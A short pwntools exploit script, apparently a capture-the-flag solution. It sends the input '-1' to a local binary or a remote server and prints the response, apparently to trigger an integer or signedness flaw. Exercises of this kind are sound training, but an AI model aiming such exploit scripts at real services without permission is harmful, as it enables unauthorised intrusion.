#!/usr/bin/python3
import pwn
import sys

if __name__ == '__main__':
    attack = b"-1"
    target = None

    if len(sys.argv) != 3:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server

    target.sendline(attack)
    print(target.recvall().decode("utf-8", "ignore").strip())
